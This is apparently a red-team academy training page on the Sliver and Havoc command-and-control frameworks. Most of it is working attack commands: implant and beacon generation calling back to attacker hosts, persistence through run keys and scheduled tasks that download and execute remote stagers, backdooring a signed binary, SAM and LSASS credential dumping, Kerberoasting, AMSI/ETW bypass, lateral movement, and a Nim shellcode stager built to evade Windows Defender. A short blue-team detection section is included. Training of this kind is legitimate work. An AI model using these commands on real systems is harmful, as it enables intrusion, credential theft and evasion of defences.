---
layout: training-page
title: "Sliver / Havoc — Red Team Academy"
module: "C2 Frameworks"
tags:
  - sliver
  - havoc
  - c2
  - open-source
page_key: "c2-sliver"
render_with_liquid: false
---

# Sliver & Havoc

## Overview

**Sliver** (by BishopFox) is a fully open-source C2 framework written in Go. It supports multiple transport protocols, cross-platform implants, a strong extension ecosystem (armory), and multiplayer operation. It's the most widely adopted Cobalt Strike alternative for teams without a commercial license. **Havoc** is a newer open-source C2 with a modern UI and Cobalt Strike-like Beacon workflow — covered at the end of this page.

![Sliver C2 architecture: operator uses sliver-client CLI, connects to Sliver server via gRPC mTLS, server manages session and beacon implants on target hosts](/images/c2-frameworks/sliver-arch.svg)  
*// sliver c2 architecture — open-source, multiplayer, multi-transport*

## Sliver — Server Setup

Sliver runs a server process that operators connect to via an interactive console. It supports both single-operator and multiplayer mode.

```
# Install Sliver (Kali / Debian):
curl https://sliver.sh/install | sudo bash

# Or download binary:
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -O sliver-server
chmod +x sliver-server && sudo mv sliver-server /usr/local/bin/

# Start Sliver server:
sudo sliver-server

# Multiplayer mode — generate operator config for a teammate:
sliver > multiplayer
sliver > new-operator --name james --lhost 10.10.10.1 --save /tmp/james.cfg

# Teammate connects with:
sliver-client --config /tmp/james.cfg

# Daemon mode (background service):
sudo sliver-server daemon
```

## Listeners

Sliver supports mTLS, WireGuard, HTTP/S, DNS, and TCP listeners. mTLS is the default — mutual TLS with per-implant certificate pinning.

```
># mTLS listener (default, most secure):
sliver > mtls
sliver > mtls --lport 8888    # custom port

# HTTPS listener (port 443, blends with web traffic):
sliver > https
sliver > https --lport 443 --domain yourdomain.com

# HTTP listener (unencrypted, use only in lab):
sliver > http --lport 80

# DNS listener (for DNS-based C2):
sliver > dns --domains c2.yourdomain.com

# TCP listener (raw TCP, fast in lab environments):
sliver > tcp --lport 4444

# List active listeners ("jobs"):
sliver > jobs

# Kill a listener:
sliver > jobs -k 1
```

## Implant Generation

Sliver generates implants (called "slivers") in multiple formats. Implants are compiled Go binaries — cross-platform, single binary, no dependencies.

```
# Generate Windows x64 implant (mTLS):
sliver > generate --mtls ATTACKER_IP:8888 --os windows --arch amd64 --format exe --save /tmp/implant.exe

# Generate Linux implant (HTTPS):
sliver > generate --http https://ATTACKER:443 --os linux --arch amd64 --format elf --save /tmp/implant

# Generate macOS implant:
sliver > generate --mtls ATTACKER_IP:8888 --os darwin --arch amd64 --format macho --save /tmp/implant

# Generate shellcode (for injection):
sliver > generate --mtls ATTACKER_IP:8888 --os windows --arch amd64 --format shellcode --save /tmp/implant.bin

# Generate DLL:
sliver > generate --mtls ATTACKER_IP:8888 --os windows --arch amd64 --format shared --save /tmp/implant.dll

# Named implants (easier to track across ops):
sliver > generate --mtls ATTACKER_IP:8888 --os windows --name CORPORATE-LAPTOP-01 --save /tmp/

# Beacon mode (async, like CS Beacon) vs session mode (interactive):
sliver > generate beacon --mtls ATTACKER_IP:8888 --seconds 60 --jitter 30 --os windows --save /tmp/beacon.exe

# List generated implants:
sliver > implants
```

## Sessions vs Beacon Mode

Sliver supports two implant modes. **Sessions** maintain a persistent interactive connection — commands run immediately. **Beacons** check in on a schedule — commands queue until next check-in, like Cobalt Strike Beacon.

```
># Session mode — immediate command execution (noisy, good for lab/active phases):
# Implant generated without --beacon flag → establishes session on execution

# Beacon mode — async, scheduled check-ins (stealthy, good for long-haul ops):
# Implant generated with --beacon flag and --seconds interval

# View incoming connections:
sliver > sessions       # list interactive sessions
sliver > beacons        # list beacon check-ins

# Interact with session:
sliver > use SESSION_ID
sliver (IMPLANT_NAME) > whoami

# Interact with beacon:
sliver > beacons        # shows pending tasks and last check-in
sliver > use BEACON_ID  # queue commands for next check-in
```

## Core Session Commands

Once inside a Sliver session, these commands cover situational awareness, file operations, execution, and persistence.

```
# Situational awareness:
sliver (TARGET) > info           # implant info, hostname, OS, PID, user
sliver (TARGET) > whoami         # current user (local and domain)
sliver (TARGET) > getuid         # UID/username
sliver (TARGET) > getgid         # GID
sliver (TARGET) > getpid         # implant PID

# Process list:
sliver (TARGET) > ps             # process list
sliver (TARGET) > ps -e winlogon # filter by name

# Network:
sliver (TARGET) > ifconfig       # network interfaces
sliver (TARGET) > netstat        # connections and listeners

# File system:
sliver (TARGET) > ls             # directory listing
sliver (TARGET) > ls C:\\Users\\Administrator
sliver (TARGET) > pwd            # current directory
sliver (TARGET) > cd C:\\Temp
sliver (TARGET) > download C:\\Users\\Administrator\\secret.txt
sliver (TARGET) > upload /tmp/tool.exe C:\\Windows\\Temp\\tool.exe
sliver (TARGET) > cat C:\\Windows\\System32\\drivers\\etc\\hosts

# Execute commands:
sliver (TARGET) > execute --output cmd.exe /c whoami /all
sliver (TARGET) > execute -o powershell.exe -c "Get-Process | Select-Object Name,Id"
sliver (TARGET) > shell          # interactive shell (session mode only)

# Screenshot:
sliver (TARGET) > screenshot     # saves to local file
```

## Pivoting

Sliver supports port forwarding and SOCKS5 proxying through active sessions.

```
# SOCKS5 proxy through session:
sliver (TARGET) > socks5 start --host 127.0.0.1 --port 1080
# Configure proxychains: socks5 127.0.0.1 1080

# Stop SOCKS5:
sliver (TARGET) > socks5 stop --id 1

# Port forward (local attacker port → remote host via implant):
sliver (TARGET) > portfwd add --remote 10.10.10.5:3389 --bind 127.0.0.1:13389
# Then: rdesktop 127.0.0.1:13389

# List port forwards:
sliver (TARGET) > portfwd

# Remove port forward:
sliver (TARGET) > portfwd rm --id 1

# WireGuard-based tun interface pivot:
sliver (TARGET) > wg-portfwd add --remote 10.10.10.5:22 --bind 127.0.0.1:10022
```

## Armory — Extensions and BOFs

The Sliver armory provides community extensions including BOF (Beacon Object File) wrappers, making tools like Seatbelt and SharpHound available directly in the console.

```
# Install armory and browse available packages:
sliver > armory

# Install specific extension:
sliver > armory install seatbelt
sliver > armory install sharp-hound-4
sliver > armory install nanodump

# List installed extensions:
sliver > extensions

# Run installed extension in session:
sliver (TARGET) > seatbelt -group=all
sliver (TARGET) > sharp-hound-4 -- --CollectionMethods All --ZipFileName loot.zip

# Execute BOF (Beacon Object File) directly:
sliver (TARGET) > bof /path/to/whoami.o

# Execute .NET assembly in memory:
sliver (TARGET) > execute-assembly /path/to/Rubeus.exe "kerberoast /outfile:hashes.txt"
sliver (TARGET) > execute-assembly /path/to/Seatbelt.exe -group=all
```

## Havoc C2

**Havoc** (by HavocFramework) is a modern open-source C2 with a Cobalt Strike-inspired workflow. Its agent is called **Demon**. Features include custom malleable-style profiles, in-memory .NET execution, BOF support, and a clean GUI.

```
># Havoc server setup:
git clone https://github.com/HavocC2/Havoc
cd Havoc
make
./havoc server --profile ./profiles/havoc.yaotl -v --debug

# Connect with Havoc client (GUI):
./havoc client

# Havoc profile snippet (havoc.yaotl):
Teamserver {
    Host = "0.0.0.0"
    Port = 40056
    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
    }
}

Operators {
    operator "james" {
        Password = "password"
    }
}

Listeners {
    Http {
        Name = "http-80"
        Hosts = ["yourdomain.com"]
        Port = 80
    }
}

# Generate Demon agent (from Havoc GUI):
# Payloads → Generate → Demon → configure options → Generate

# Core Demon commands (in Havoc console):
# shell cmd.exe /c whoami
# powershell Get-Process
# download C:\path\to\file
# upload /local/path C:\remote\path
# ps                   # process list
# inject <PID> x64     # inject shellcode into PID
# dotnet inline-execute /path/to/assembly.exe "args"
```

## Implant Generation — Beacon Flags

Beacon mode implants check in on a schedule and execute queued tasks asynchronously. Key flags control timing and obfuscation. Symbol obfuscation (enabled by default) increases binary size but removes Go import paths that reveal the framework.

```
# Generate HTTP beacon with custom interval and jitter:
sliver > generate beacon --http 10.10.14.62:8088 --os windows --seconds 60 --jitter 30 -N http_beacon

# Skip symbol obfuscation (faster build, smaller binary, but strings visible):
sliver > generate beacon --http 10.10.14.62:8088 --skip-symbols -N http_beacon --os windows

# Check if --skip-symbols exposes framework strings:
# strings http_beacon.exe | grep sliver   # reveals github.com/bishopfox/sliver paths

# Generate session implant (interactive, not beacon):
sliver > generate --http 10.10.14.62:8088 --os windows -N http_session

# List all generated implant builds:
sliver > implants

# Upgrade beacon to interactive session:
sliver (beacon_name) > interactive
# Then use the new session ID that appears
```

## Stager Workflow

Stagers are minimal loaders that fetch and execute a full implant at runtime. Useful when you need a small initial payload (e.g., a web shell or msfvenom ASPX). Requires a profile, a stage listener, and an HTTP listener.

```
# 1. Create a profile (implant blueprint):
sliver > profiles new --http 10.10.14.62:8088 --format shellcode htb

# 2. Start a stage listener (TCP or HTTP):
sliver > stage-listener --url tcp://10.10.14.62:4443 --profile htb
# [*] Job 2 (tcp) started

# 3. Start the HTTP C2 listener:
sliver > http -L 10.10.14.62 -l 8088

# 4. Generate a stager payload (shellcode in CSharp format):
sliver > generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt

# 5. (Optional) Generate an msfvenom ASPX wrapper:
# msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx
# Then replace the byte[] payload in the ASPX with the shellcode from staged.txt
```

## HTTP C2 Traffic Profile

Sliver's HTTP C2 profile controls URL patterns, headers, and file extensions to blend implant traffic with legitimate web traffic. Edit `~/.sliver/config/http-c2.json` to customize.

```
# Default HTTP traffic pattern (from source):
# Beacon check-in:  POST /rpc.php?a=<nonce>
# Task polling:     GET  /bootstrap.min.js?t=<nonce>
# Task result:      POST /auth/sign-up.php?x=<nonce>

# For production ops: edit ~/.sliver/config/http-c2.json
# - Add legitimate-looking request/response headers (User-Agent, etc.)
# - Change URL patterns to mimic a real app (CDN paths, API endpoints)
# - Change file extensions used in URL generation
# See: https://sliver.sh/docs?name=HTTPS+C2

# Use HTTPS/mTLS/WireGuard listeners for encrypted C2 channels:
sliver > https --lport 443 --domain yourdomain.com
sliver > mtls --lport 8444
```

## execute-assembly and In-Process Execution

`execute-assembly` runs a .NET binary on the target by spawning a child process (notepad.exe by default). The `--in-process` flag avoids child process creation but is detectable in the implant's memory.

```
# Run a .NET assembly via child process (default — notepad.exe):
sliver (session) > execute-assembly Seatbelt.exe -group=system
sliver (session) > execute-assembly Rubeus.exe "kerberoast /outfile:hashes.txt"

# Specify a different hosting process:
sliver (session) > execute-assembly --process msiexec.exe Seatbelt.exe -group=system

# Run in-process (no child spawn, but .NET assemblies visible in memory):
sliver (session) > execute-assembly --in-process Seatbelt.exe -group=all

# AMSI/ETW bypass flags (in-process only):
sliver (session) > execute-assembly --in-process --amsi-bypass --etw-bypass Rubeus.exe "dump"

# Armory equivalents (pre-installed extensions):
sliver (session) > seatbelt -- -group=system
sliver (session) > rubeus -- kerberoast /outfile:hashes.txt

# Download and upload:
sliver (session) > download C:\Users\Administrator\secret.txt
sliver (session) > upload /tmp/tool.exe C:\Windows\Temp\tool.exe
sliver (session) > upload /tmp/tool.exe C:/Windows/Temp/tool.exe   # forward slashes also work
```

## Persistence via Sliver

Establishing persistence ensures callbacks survive reboots without repeating initial access steps. Common methods include scheduled tasks, startup folders, and registry run keys. The `backdoor` command embeds shellcode into an existing binary.

```
# --- Scheduled task (via execute, encoded PowerShell) ---
# Encode stager URL download as UTF-16LE Base64:
# echo -en "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0
# Then create the task from within Sliver:
sliver (session) > execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr "powershell.exe -enc <BASE64>" /ru SYSTEM'

# --- Startup folder (SharPersist) ---
sliver (session) > sharpersist -- -t startupfolder -c "powershell.exe" -a "-nop -w hidden iex(new-object net.webclient).downloadstring('http://10.10.14.62:8088/stager.txt')" -f "Edge Updater" -m add
# LNK placed at: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Edge Updater.lnk

# --- Registry Run key (SharPersist) ---
sliver (session) > sharpersist -- -t reg -c "powershell.exe" -a "-nop -w hidden iex(new-object net.webclient).downloadstring('http://10.10.14.62:8088/stager.txt')" -k "hklmrun" -v "AdvancedProtection" -m add
# Targets: HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# List run key entries:
sliver (session) > sharpersist -- -t reg -k "hklmrun" -m list

# --- Binary backdoor (Sliver built-in backdoor command) ---
# Create a shellcode profile first:
sliver (session) > profiles new --format shellcode --http 10.10.14.62:9002 persistence-shellcode
sliver (session) > http -L 10.10.14.62 -l 9002
# Backdoor an existing signed binary (e.g., putty.exe):
sliver (session) > backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"
# Every launch of putty.exe now delivers a new beacon
```

## Pivoting — Named Pipes and Chisel

Named pipe pivots create a bind-shell-like chain between internal hosts when direct C2 communication is impossible. Chisel (via a Sliver extension fork) provides SOCKS5 tunneling through the implant.

```
># --- Named Pipe Pivot (Windows only, requires session mode) ---
# On the pivot host session:
sliver (session) > pivots named-pipe --bind academy
# [*] Started named pipe pivot listener \\.\pipe\academy with id 1

# Generate a pivot implant connecting via that named pipe:
sliver > generate --named-pipe 127.0.0.1/pipe/academy -N pipe_academy --skip-symbols
# Transfer pipe_academy.exe to the internal host and execute it

# Enumerate named pipes on target:
# PowerShell: ls \\.\pipe\

# --- Chisel Extension (via MrAle98 fork) ---
# Setup (one-time):
# git clone https://github.com/MrAle98/chisel
# cd chisel && mkdir ~/.sliver-client/extensions/chisel
# cp extension.json ~/.sliver-client/extensions/chisel
# make windowsdll_64 && make windowsdll_32
# cp chisel.x64.dll ~/.sliver-client/extensions/chisel/
# Restart sliver-client to load the extension

# Start Chisel server on attacker:
# chisel server --reverse -p 1337 -v --socks5

# Connect from implant:
sliver (session) > chisel client 10.10.14.62:1337 R:socks
# Proxychains config: socks5 127.0.0.1 1080

# List/stop chisel tasks:
sliver (session) > chisel list
sliver (session) > chisel stop <taskId>

# --- SSH Reverse Port Forward (from Windows target) ---
# Target has OpenSSH client (Windows 10+). SSH reverse dynamic port forward:
# On attacker — allow SSH on alternate port:
# echo "Port 2222" >> /etc/ssh/sshd_config && systemctl restart sshd
# From RDP session on Windows target:
# ssh -R 1080 <attacker_user>@<attacker_ip> -p 2222
# This creates SOCKS4/5 proxy at attacker:1080 routing through the target
```

## Assumed Breach — Sliver Workflow

An assumed breach engagement provides credentials for a workstation inside the network. The workflow: RDP in, enumerate privileges and UAC state, deploy a beacon, escalate to SYSTEM, dump credentials.

```
# Connect via RDP with provided credentials:
# xfreerdp /v:<TARGET_IP> /u:eric /p:Letmein123 /d:child.htb.local /dynamic-resolution /cert-ignore /drive:academy,"$(pwd)"

# Situational awareness:
# net localgroup Administrators           — check local admin group membership
# whoami /groups                          — check integrity level and group SIDs
# REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
# REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# ConsentPromptBehaviorAdmin = 0x0 → elevation without consent (UAC bypass trivial)

# Generate beacon and start listener:
sliver > generate beacon --http 10.10.14.62:9001 --skip-symbols --os windows -N http-beacon-9001
sliver > http -L 10.10.14.62 -l 9001

# Upgrade beacon to session for getsystem:
sliver (beacon) > interactive
sliver (beacon) > use <session_id>
sliver (session) > getsystem         # injects into spoolsv.exe by default → NT AUTHORITY\SYSTEM

# Dump local SAM hashes (requires SYSTEM beacon):
sliver (system_beacon) > hashdump

# Dump LSASS process:
sliver (system_beacon) > ps -e lsass
sliver (system_beacon) > procdump --pid <lsass_pid> --save /tmp/lsass.dmp
# Parse offline: pypykatz lsa minidump /tmp/lsass.dmp
```

## Domain Reconnaissance via sharpsh + PowerView

`sharpsh` uses the RunSpaceFactory namespace to execute PowerShell modules downloaded from a web server, bypassing PowerShell logging and AMSI. Combined with `PowerView`, this enables full AD enumeration without touching disk. Commands must be Base64-encoded first.

```
# Step 1: Encode the PowerView command on your attacker box
echo -n "get-netuser | select samaccountname,description" | base64
# Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u

# Step 2: Host PowerView.ps1 on attacker web server
python3 -m http.server 8081

# Step 3: Run via sharpsh — fetches PowerView over HTTP, executes encoded command in-memory
sliver (http-beacon) > sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'

# Common PowerView commands to encode:
# get-netuser | select samaccountname,description
# Get-NetUser -PreauthNotRequired | select samaccountname       (AS-REP roastable users)
# Get-NetUser -spn | select samaccountname,description          (Kerberoastable users)
# Get-NetGroup -GroupName "Domain Admins" -Recurse              (group members)
# Get-NetComputer | select dnshostname,operatingsystem          (hosts in domain)

# SharpView via execute-assembly (AMSI+ETW bypass, 254 char limit on args):
sliver (http-beacon) > execute-assembly /home/user/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M

# Domain structure enumeration via c2tc-domaininfo (Armory BOF — no binary needed):
sliver (http-beacon) > c2tc-domaininfo

# Network adapter enumeration (identify dual-homed hosts, pivot points):
sliver (http-beacon) > ifconfig

# ADCS certificate template enumeration (look for ESC misconfigurations):
sliver (http-beacon) > certify -- find

# PowerShell built-in (spawns visible window — bad OPSEC):
sliver (http-beacon) > execute -o powershell "$Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); $Forest.Domains"
```

## Impersonation — make-token

`make-token` creates a new logon session using harvested credentials and impersonates the resulting token. Unlike `runas`, it doesn't spawn a new process — the current beacon adopts the new token, giving access to network resources as that user.

```
# Syntax:
sliver (http-beacon) > make-token -u USERNAME -d DOMAIN -p PASSWORD

# Example — impersonate svc_sql in child.htb.local:
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
# [*] Successfully impersonated child.htb.local\svc_sql. Use `rev2self` to revert.

# Verify access to target share after impersonation:
sliver (http-beacon) > ls //srv01.child.htb.local/c$

# Revert to original token:
sliver (http-beacon) > rev2self
```

| Logon Type | Description |
| --- | --- |
| LOGON_INTERACTIVE | Console or RDP logon; creates full interactive session |
| LOGON_NETWORK | High-performance; accepts password, NT hash, or Kerberos ticket |
| LOGON_BATCH | Scheduled task / startup context |
| LOGON_SERVICE | Account must have service privileges |
| LOGON_NETWORK_CLEARTEXT | Cleartext credential logon |
| LOGON_NEW_CREDENTIALS | **Default** — clones current token, uses new credentials for outbound connections only |

```
# Specify logon type explicitly:
sliver (http-beacon) > make-token -u alice -d corp.local -p Password123 --logon-type LOGON_NETWORK
```

## Lateral Movement — PsExec via TCP Pivot

PsExec uploads a service binary to the target and creates a Windows service to execute it. When the internal target can't reach the C2 server directly, a TCP pivot listener on the compromise host chains the traffic. The service binary must be in `service` format.

```
# Step 1: Impersonate a user with local admin on the target
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!

# Step 2: Start TCP pivot listener on the compromise host (internal IP)
# The internal target will connect back through this pivot to reach the C2
sliver (http-beacon) > pivots tcp --bind 172.16.1.11
# [*] Started tcp pivot listener 172.16.1.11:9898 with id 1

# Step 3: Generate a service-format implant that connects via the pivot
sliver (http-beacon) > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

# Step 4: PsExec to the target — uploads and runs the service binary
sliver (http-beacon) > psexec --custom-exe /home/user/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local
# [*] Session 23471b15 psexec-pivot - ... (srv01) NT AUTHORITY\SYSTEM

# WMIC lateral movement alternative (upload binary, then trigger via WMI):
sliver (http-beacon) > generate -i 172.16.1.11:9898 --skip-symbols -N wmicpivot
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
sliver (http-beacon) > upload wmicpivot.exe //srv02.child.htb.local/c$/windows/tasks/wmicpivot.exe
sliver (http-beacon) > rev2self
sliver (http-beacon) > execute -o wmic /node:172.16.1.13 /user:svc_sql /password:jkhnrjk123! process call create "C:\\windows\\tasks\\wmicpivot.exe"

# DCOM via Impacket (through SOCKS5 proxy established with socks5 start -P 1080):
# proxychains impacket-dcomexec -object MMC20 child/svc_sql:'jkhnrjk123!'@172.16.1.13

# List active pivots and sessions:
sliver (http-beacon) > pivots
sliver (http-beacon) > sessions
```

## Kerberoasting via inline-execute-assembly

`inline-execute-assembly` executes .NET assemblies as a BOF (Beacon Object File) — no child process is spawned. Combined with the AMSI/ETW bypasses in Sliver, Rubeus can be run entirely in-memory. First enumerate SPNs to identify kerberoastable accounts.

```
# Step 1: Enumerate Kerberoastable users with PowerView via sharpsh
echo -n "Get-NetUser -spn | select samaccountname,description" | base64
# Outputs: R2V0LU5ldFVzZXIgLXNwbiB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZSxkZXNjcmlwdGlvbgo=

sliver (http-beacon) > sharpsh -- '-u http://10.10.14.62:8080/PowerView.ps1 -e -c "R2V0LU5ldFVzZXIgLXNwbiB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZSxkZXNjcmlwdGlvbgo="'

# Alternative: delegationbof from Armory (6 = SPN check)
sliver (http-beacon) > delegationbof 6 child.htb.local

# Step 2: Kerberoast target user with Rubeus via inline-execute-assembly
sliver (http-beacon) > inline-execute-assembly /home/user/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
# Output: $krb5tgs$23$*alice$child.htb.local$...

# ASREPRoast (users without Kerberos pre-authentication):
sliver (http-beacon) > inline-execute-assembly /home/user/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'
# Output: $krb5asrep$23$bob@child.htb.local:...

# Crack offline:
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt  # Kerberoast
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt  # ASREPRoast

# BOF alternatives from Armory:
sliver (http-beacon) > c2tc-kerberoast roast alice     # returns ticket (convert with TicketToHashcat.py)
sliver (http-beacon) > bof-roast rdp/web01.child.htb.local  # SPN-based (convert with apreq2hashcat.py)

# Setspn.exe — enumerate SPNs natively (bad OPSEC — spawns cmd):
sliver (http-beacon) > execute -o setspn.exe -Q */*
```

## Detection of Sliver — Blue Team Perspective

Sliver has well-known detection artifacts documented by Microsoft and community researchers. Key detection points: hardcoded PowerShell arguments in the shell command, getsystem injection patterns, and psexec service naming.

```
># --- Sigma Rule: shell command detection ---
# Sliver's shell command hardcodes these PowerShell flags (shell_windows.go):
# powershell.exe -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8
# Sigma rule triggers on CommandLine containing that exact string (level: critical)

# --- getsystem detection ---
# getsystem injects into spoolsv.exe (default) via CreateRemoteThread
# KQL / MDE query from Microsoft "Looking for the Sliver lining" blog:
# DeviceEvents
# | where FileName == 'spoolsv.exe'
# | where ActionType == 'CreateRemoteThreadApiCall'
# | where InitiatingProcessFileName !~ 'csrss.exe'
# | project InitiatingProcessId, DeviceId, CreateTime=Timestamp, FileName
# SeDebugPrivilege assignment also flagged — getsystem calls SePrivEnable("SeDebugPrivilege")
# Bypass: change --process to svchost.exe, but SeDebugPrivilege still detected

# --- psexec detection (Velociraptor VQL) ---
# Windows.System.Services.SliverPSExec artifact:
# SELECT * FROM Artifact.Windows.System.Services()
# WHERE Name =~ "^Sliver" or DisplayName =~ "^Sliver" or
#       Description =~ "Sliver implant" or
#       PathName =~ ":\\Windows\\Temp\\[a-zA-Z0-9]{10}\.exe"
# Also monitors Event ID 7045 (new service installed) for same patterns
# Defaults: service name "Sliver", binary in C:\Windows\Temp\, random 10-char name
# Mitigations: change -b/--binpath and --service-name flags to non-default values

# --- YARA / string detection ---
# Non-obfuscated implants (--skip-symbols) contain plaintext Go import paths:
# "github.com/bishopfox/sliver" — trivially detectable
# Obfuscated implants use garble — removes these strings but increases binary size

# Reference: https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/
```

## Sliver Quick Reference

Common Sliver commands from the cheatsheet — server and session context.

```
# Server context commands:
# help                                                  — list all commands
# http -L <IP> -l <Port>                              — start HTTP listener
# profiles new --http <IP>:<Port> --format shellcode <Name> — create C2 profile
# stage-listener --url tcp://<IP>:<Port> --profile <Name>   — stager listener
# generate --http <IP>:<Port> --os <OS>              — session implant
# generate beacon --http <IP>:<Port> --os <OS>       — beacon implant
# sessions                                              — list active sessions
# sessions -K                                           — remove all sessions
# sessions prune                                        — remove unavailable sessions
# sessions -k -i <session>                             — remove specific session
# beacons                                               — list all beacons
# tasks                                                 — list pending/completed tasks
# use <id>                                             — interact with session or beacon
# multiplayer                                           — enable multiplayer mode
# new-operator -n <name> -l <ip>                      — create operator config
# armory install <name>                                 — install extension/alias
# armory install all                                    — install all extensions

# Session/beacon context commands:
# getsystem                                             — escalate to NT AUTHORITY\SYSTEM
# interactive                                           — spawn interactive session from beacon
# cd / ls / pwd / cat / download / upload               — filesystem operations
# execute-assembly <binary.exe> [args]                  — run .NET assembly in child process
# execute-shellcode <shellcode_file>                    — execute raw shellcode in process
# ps / ps -e <name>                                     — process list / filter by name
# hashdump                                              — dump local SAM hashes (SYSTEM required)
# procdump --pid <pid> --save <file>                    — dump process memory
# socks5 start -P 1080                                  — start SOCKS5 proxy
# pivots named-pipe --bind <name>                       — named pipe pivot listener
```

## Defender Bypass — Nim Shellcode Stager

A Nim-based shellcode stager bypasses Windows Defender by using the `winim` library to make Windows API calls without the telemetry signatures of common loaders. The stager downloads raw shellcode from a web server and executes it in-process. The `builder.py` script automates compilation from Linux.

### How the Stager Works

```
# Architecture:
# 1. Nim stager (stager.exe) runs on target
# 2. Downloads shellc.bin from http://ATTACKER_IP:PORT/shellc.bin via httpclient
# 3. Allocates RWX memory with VirtualAllocEx on current process handle
# 4. Copies shellcode into the allocation with copyMem
# 5. Casts pointer to proc() and calls it — executes Sliver shellcode in-process

# Why Nim bypasses Defender:
# - Nim compiles to C → minimal runtime, no CLR telemetry
# - winim wraps Windows API via native bindings (not pinvoke signatures)
# - No known shellcode loader signatures in the Nim → C → PE pipeline
# - Stager has no embedded shellcode (fetches at runtime) → static scan misses payload
```

### Builder Script Usage

```
# Prerequisites (Debian/Kali):
# - Python 3
# - sudo privileges (installs mingw-w64 and nim if missing)
# - Internet access (downloads winim library via nimble)

# Run builder.py to generate stager.exe:
python3 builder.py -l 192.168.1.5 -p 80

# What builder.py does automatically:
# 1. Writes stager.nim with IP/port embedded in download URL
# 2. Checks for mingw-w64 (cross-compiler) — installs via apt if missing
# 3. Checks for nim compiler — installs via apt if missing
# 4. Runs: nimble install -y winim
# 5. Cross-compiles stager.nim → stager.exe (Windows x64):
#    nim c -d:mingw --os:windows --cpu:amd64
#      --cc:gcc
#      --gcc.exe:x86_64-w64-mingw32-gcc
#      --gcc.linkerexe:x86_64-w64-mingw32-gcc
#      stager.nim

# Manual install (if builder fails):
sudo apt install -y mingw-w64 nim
nimble install -y winim
```

### Sliver Shellcode Generation

```
# In Sliver console — generate shellcode payload:
generate --mtls 192.168.1.5:443 --os windows --arch amd64 --format shellcode

# Rename output file (Sliver generates a random name):
mv *.bin shellc.bin

# Host shellc.bin on your web server:
python3 -m http.server 80

# The stager fetches: http://192.168.1.5:80/shellc.bin
# Adjust -p flag to match the port python3 http.server is on

# Alternative — use a proper C2 redirector or Sliver's built-in HTTP listener:
# Generate with --http instead of --mtls for HTTP-based shellcode:
generate --http 192.168.1.5:80 --os windows --arch amd64 --format shellcode
```

### Full Workflow

```
# Step 1: Start Sliver teamserver
sliver-server

# Step 2: Start HTTP/mTLS listener in Sliver
sliver > http -L 0.0.0.0 -l 443

# Step 3: Generate shellcode
sliver > generate --mtls 192.168.1.5:443 --os windows --arch amd64 --format shellcode
# [*] Implant saved to SOME_NAME.bin

# Step 4: Rename and host shellcode
mv SOME_NAME.bin shellc.bin
python3 -m http.server 80

# Step 5: Build stager.exe
python3 builder.py -l 192.168.1.5 -p 80
# [SUCCESS] stager.exe has been generated!

# Step 6: Deliver stager.exe to target (phishing, USB, exploit)
# Target executes stager.exe → downloads shellc.bin → Sliver session opens

# Step 7: Interact with session in Sliver
sliver > sessions
sliver > use <session_id>
[session] > whoami
[session] > shell
```

### Detection & OPSEC

```
# Detection vectors for this technique:
# - Network: HTTP GET to /shellc.bin (predictable URL pattern)
#   Mitigate: host shellcode at a random or disguised path (/images/logo.png)
# - Memory: RWX allocation in current process (VirtualAllocEx PAGE_EXECUTE_READ_WRITE)
#   Mitigate: allocate PAGE_READWRITE → copy → VirtualProtect PAGE_EXECUTE_READ
# - Behavioral: process downloading a binary and immediately executing memory
#   Mitigate: add sleep before allocation, use process injection into a remote PID
# - Network: mTLS certificate fingerprinting (Sliver default cert is known)
#   Mitigate: use custom TLS certificate and malleable C2 profile

# Note: stager fetches shellcode over plain HTTP by default (port 80)
# For operational use, serve shellc.bin over HTTPS with a valid cert:
# Use caddy or nginx with Let's Encrypt certificate

# OPSEC improvement — custom shellcode delivery:
# Instead of python http.server, use a redirector:
# nginx proxy_pass → teamserver (hides real server IP)
# Apache mod_rewrite → only serve shellc.bin to known user-agents
```
